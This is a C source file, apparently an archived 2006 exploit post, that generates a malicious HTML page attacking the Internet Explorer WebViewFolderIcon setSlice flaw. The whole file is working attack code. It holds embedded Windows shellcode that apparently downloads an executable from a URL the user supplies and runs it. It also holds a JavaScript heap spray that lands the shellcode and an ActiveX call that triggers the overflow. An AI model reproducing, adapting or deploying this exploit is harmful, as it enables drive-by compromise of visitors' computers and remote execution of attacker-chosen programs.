/*
*-----------------------------------------------------------------------
*
* Microsoft Internet Explorer WebViewFolderIcon (setSlice) Exploit (0day)
*	Works on all Windows XP versions including SP2
*
*	Author: LukeHack 
*	Mail: lukehack@fastwebnet.it
*
*	Bug discovered by Computer H D Moore (http://www.metasploit.com)
*
*	Credit: metasploit, jamikazu, yag kohna(for the shellcode)
*
*          :
* Tested   : 
*          : Windows XP SP2 + Internet Explorer 6.0 SP1 
*          :
* Complie  : cl pociewvf.c
*          :
* Usage    : c:\>pociewvf
*          :
*          :Usage: pociewvf <exe_URL> [htmlfile]
*          :
*          
*          
*------------------------------------------------------------------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

FILE *fp = NULL;
char *file = "lukehack.htm";
char *url = NULL;

unsigned char sc[] =     
"\xEB\x54\x8B\x75\x3C\x8B\x74\x35\x78\x03\xF5\x56\x8B\x76\x20\x03"
"\xF5\x33\xC9\x49\x41\xAD\x33\xDB\x36\x0F\xBE\x14\x28\x38\xF2\x74"
"\x08\xC1\xCB\x0D\x03\xDA\x40\xEB\xEF\x3B\xDF\x75\xE7\x5E\x8B\x5E"
"\x24\x03\xDD\x66\x8B\x0C\x4B\x8B\x5E\x1C\x03\xDD\x8B\x04\x8B\x03"
"\xC5\xC3\x75\x72\x6C\x6D\x6F\x6E\x2E\x64\x6C\x6C\x00\x43\x3A\x5C"
"\x55\x2e\x65\x78\x65\x00\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40"
"\x0C\x8B\x70\x1C\xAD\x8B\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C"
"\x8B\x40\x3C\x95\xBF\x8E\x4E\x0E\xEC\xE8\x84\xFF\xFF\xFF\x83\xEC"
"\x04\x83\x2C\x24\x3C\xFF\xD0\x95\x50\xBF\x36\x1A\x2F\x70\xE8\x6F"
"\xFF\xFF\xFF\x8B\x54\x24\xFC\x8D\x52\xBA\x33\xDB\x53\x53\x52\xEB"
"\x24\x53\xFF\xD0\x5D\xBF\x98\xFE\x8A\x0E\xE8\x53\xFF\xFF\xFF\x83"
"\xEC\x04\x83\x2C\x24\x62\xFF\xD0\xBF\x7E\xD8\xE2\x73\xE8\x40\xFF"
"\xFF\xFF\x52\xFF\xD0\xE8\xD7\xFF\xFF\xFF";

char * header =
"<html>\n"
"<body>\n"
"<script>\n"
"\tvar heapSprayToAddress = 0x05050505;\n"
"\tvar shellcode = unescape(\"%u9090\"+\"%u9090\"+ \n";

char * footer =
"var heapBlockSize = 0x400000;\n"
"var payLoadSize = shellcode.length * 2;\n"
"var spraySlideSize = heapBlockSize - (payLoadSize+0x38);\n"
"var spraySlide = unescape(\"%u0505%u0505\");\n"
"spraySlide = getSpraySlide(spraySlide,spraySlideSize);\n"
"heapBlocks = (heapSprayToAddress - 0x400000)/heapBlockSize;\n"
"memory = new Array();\n\n"
"for (i=0;i<heapBlocks;i++)\n{\n"
"\t\tmemory[i] = spraySlide + shellcode;\n}\n"
"for ( i = 0 ; i < 128 ; i++)\n{\n\t"
"try\n\t{\n\t\tvar tar = new ActiveXObject('WebViewFolderIcon.WebViewFolderIcon.1');\n"
"\t\ttar.setSlice(0x7ffffffe, 0x05050505, 0x05050505,0x05050505 );\n" 
"\t}\n\tcatch(e){}\n}\n\n"
"function getSpraySlide(spraySlide, spraySlideSize)\n{\n\t"
"while (spraySlide.length*2<spraySlideSize)\n\t"
"{\n\t\tspraySlide += spraySlide;\n\t}\n"
"\tspraySlide = spraySlide.substring(0,spraySlideSize/2);\n\treturn spraySlide;\n}\n\n"
"</script>\n"
"</body>\n"
"</html>\n";

// print unicode shellcode
void PrintPayLoad(char *lpBuff, int buffsize)
{
   int i;
   for(i=0;i<buffsize;i+=2)
   {
       if((i%16)==0)
       {
           if(i!=0)
           {
               printf("\"\n\"");
               fprintf(fp, "%s", "\" +\n\"");
           }
           else
           {
               printf("\"");
               fprintf(fp, "%s", "\"");
           }
       }
           
       printf("%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
       
       fprintf(fp, "%%u%0.4x",((unsigned short*)lpBuff)[i/2]);
     }
     

       printf("\";\n");
       fprintf(fp, "%s", "\");\n");          
   
   
   fflush(fp);
}

void main(int argc, char **argv)
{
   unsigned char buf[1024] = {0};

   int sc_len = 0;


   if (argc < 2)
   {
      printf("Microsoft Internet Explorer WebViewFolderIcon (setSlice) Exploit (0day)\n");
      printf("Code by LukeHack\n");
      printf("\r\nUsage: %s <URL> [htmlfile]\r\n\n", argv[0]);
      exit(1);
   }
   
   url = argv[1];
   

    if( (!strstr(url, "http://") &&  !strstr(url, "ftp://")) || strlen(url) < 10)
    {
        printf("[-] Invalid url. Must start with 'http://','ftp://'\n");
        return;                
    }

      printf("[+] download url:%s\n", url);
      
      if(argc >=3) file = argv[2];
      printf("[+] exploit file:%s\n", file);
       
   fp = fopen(file, "w");
   if(!fp)
   {
       printf("[-] Open file error!\n");
          return;
   }    
   
   fprintf(fp, "%s", header);
   fflush(fp);
   
   memset(buf, 0, sizeof(buf));
   sc_len = sizeof(sc)-1;
   memcpy(buf, sc, sc_len);
   memcpy(buf+sc_len, url, strlen(url));
   
   sc_len += strlen(url)+1;
   PrintPayLoad(buf, sc_len);
 
   fprintf(fp, "%s", footer);
   fflush(fp);  
   
   printf("[+] exploit write to %s success!\n", file);
}

// LukeHack coded it!

// milw0rm.com [2006-09-29]
